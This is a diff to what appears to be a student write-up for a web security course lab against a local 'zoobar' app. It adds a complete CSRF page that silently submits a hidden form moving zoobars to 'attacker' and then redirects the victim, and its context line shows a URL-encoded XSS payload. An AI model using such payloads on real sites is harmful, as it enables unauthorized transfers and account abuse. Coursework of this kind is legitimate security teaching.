@@ -20,4 +20,24 @@ localhost:8080/zoobar/index.cgi/users?user=admin%22%22%3e%3c%73%63%72%69%70%74%3
 
 ###Exercise 2: Cross-Site Request Forgery
 
+Below is provided the HTML and JavaScript code for the CSRF attack that will transfer 10 zoobars from the victim to the user 'attacker' and redirect the victim to other site.
 
+    <html>
+    <body>
+        <form name="csrf" action="http://localhost:8080/zoobar/index.cgi/transfer" method="POST" target="iframe">
+            <input type="hidden" name="zoobars" value="10" />
+            <input type="hidden" name="recipient" value="attacker" />
+        </form>
+        <iframe style="display:none" id="iframe" name="iframe" frameborder="0"></iframe>
+        <script> 
+            document.getElementById("iframe").onload = function() {
+                window.location.href = "http://css.csail.mit.edu/6.858/2014/";
+            }
+            document.forms[0].submit();
+        </script>
+    </body>
+    </html>
+
+###Exercise 3: Side Channels and Phishing
+
+###Exercise 4: Profile Worm
